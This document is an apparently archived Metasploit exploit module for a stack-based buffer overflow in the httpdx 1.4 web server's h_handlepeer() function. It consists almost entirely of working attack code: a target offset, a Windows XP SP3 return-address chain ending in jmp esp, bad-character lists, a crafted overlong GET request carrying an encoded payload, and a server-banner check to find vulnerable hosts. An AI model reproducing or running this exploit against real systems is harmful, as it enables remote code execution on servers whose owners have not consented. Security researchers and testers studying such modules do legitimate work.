httpdx 1.4 h_handlepeer BoF
===========================



# Title: httpdx 1.4 h_handlepeer BoF
# CVE-ID: ()
# OSVDB-ID: ()
# Author: Pankaj Kohli, Trancer
# Published: 2009-10-16
# Verified: yes


view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
     
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HTTPDX h_handlepeer() Function Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The
                vulnerability is caused due to a boundary error within the "h_handlepeer()" function in http.cpp.
                By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.
            },
            &#039;Author&#039;         => [
                        &#039;Pankaj Kohli <pankaj208[at]gmail.com>&#039;,  # Original exploit [see References]
                        &#039;Trancer <mtrancer[at]gmail.com>&#039;     # Metasploit implementation
                        ],
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.pank4j.com/exploits/httpdxb0f.php&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.rec-sec.com/2009/10/16/httpdx-buffer-overflow-exploit/&#039; ],
                    [ &#039;OSVDB&#039;, &#039;58714&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Privileged&#039;     => true,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00\x0a\x0b\x0d\x20\x23\x25\x26\x2c\x2f\x3a\x3b\x3d\x3f\x5c",
                    &#039;StackAdjustment&#039; => -1500,
                    &#039;DisableNops&#039;   =>  &#039;True&#039;,
 
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
            [
                [  &#039;httpdx 1.4 - Windows XP SP3&#039;,
                    {
                    &#039;Offset&#039;    => 616,
                    &#039;Rets&#039;      => [ 0x64f8134b, 0x63b8624f, 0x7c874413 ],   # pop ret (core.dll), required to reach ret instruction (n.dll), jmp esp (kernel32.dll)
                    }
                ],
            ],
            &#039;DefaultTarget&#039;  => 0))
            register_options( [ Opt::RPORT(80) ], self.class )
    end
 
    def check
        response = send_request_raw
 
        if response and
           response[&#039;Server&#039;] and
           response[&#039;Server&#039;] =~ /httpdx\/1.4 (Win32)/
            return Exploit::CheckCode::Appears
        end
             
        return Exploit::CheckCode::Safe
    end
 
    def exploit
        connect
 
        sploit  = "GET /" + rand_text_alpha_lower(3, payload_badchars) + "="
        sploit << rand_text_alphanumeric(target[&#039;Offset&#039;], payload_badchars)
        sploit << [ target[&#039;Rets&#039;][0] ].pack(&#039;V&#039;) + [ target[&#039;Rets&#039;][1] ].pack(&#039;V&#039;) + [ target[&#039;Rets&#039;][2] ].pack(&#039;V&#039;)
        sploit << payload.encoded + rand_text_alphanumeric((payload_space - payload.encoded.length), payload_badchars)
 
        request = sploit + " HTTP/1.1\r\nHost: " + rand_text_alphanumeric(rand(8) + 1) + "\r\n\r\n"
 
        print_status("Trying target #{target.name}...")
 
        sock.put(request)
        sock.close
 
        disconnect
        handler
    end
end




